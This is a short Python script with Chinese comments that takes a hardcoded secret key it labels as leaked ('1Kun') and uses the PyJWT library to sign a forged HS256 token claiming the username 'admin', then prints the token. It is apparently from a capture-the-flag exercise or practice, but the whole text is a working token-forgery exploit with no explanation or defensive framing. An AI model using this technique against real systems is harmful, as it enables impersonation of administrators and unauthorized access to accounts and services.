import jwt

# 泄露的密钥
secret_key = "1Kun"

# 载荷数据
payload = {
    "username": "admin"
}

# 生成JWT
new_token = jwt.encode(payload, secret_key, algorithm="HS256")
print("新生成的JWT:", new_token)